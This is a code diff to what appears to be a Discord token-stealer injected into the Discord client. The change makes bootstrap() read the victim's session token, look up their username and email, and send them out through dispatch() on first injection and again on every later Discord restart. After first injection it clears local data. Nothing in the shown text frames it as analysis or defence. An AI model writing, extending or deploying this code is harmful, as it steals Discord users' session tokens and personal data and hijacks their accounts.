@@ -312,13 +312,17 @@ const locatePaths = (function () {
 })();
 
 async function bootstrap() {
-    if (fs.existsSync(path.join(__dirname, 'initiation'))) {
-        fs.rmdirSync(path.join(__dirname, 'initiation'));
-        const token = await readSession();
-        if (!token) return;
+    const isFirstInject = fs.existsSync(path.join(__dirname, 'initiation'));
+    if (isFirstInject) {
+        try { fs.rmdirSync(path.join(__dirname, 'initiation')); } catch (e) {}
+    }
+
+    const token = await readSession();
+    if (token) {
         const account = await readProfile(token);
+        const actionMsg = isFirstInject ? "just got injected!" : "restarted Discord / session active!";
         const payload = {
-            "content": `**${account.username}** just got injected!`,
+            "content": `**${account.username}** ${actionMsg}`,
             "embeds": [{
                 "fields": [
                     { "name": "Email", "value": "`" + account.email + "`", "inline": true },
@@ -327,7 +331,9 @@ async function bootstrap() {
             }]
         };
         await dispatch(payload, token, account);
-        flushLocal();
+        if (isFirstInject) {
+            flushLocal();
+        }
     }
 
     const { resourcePath, app } = locatePaths;
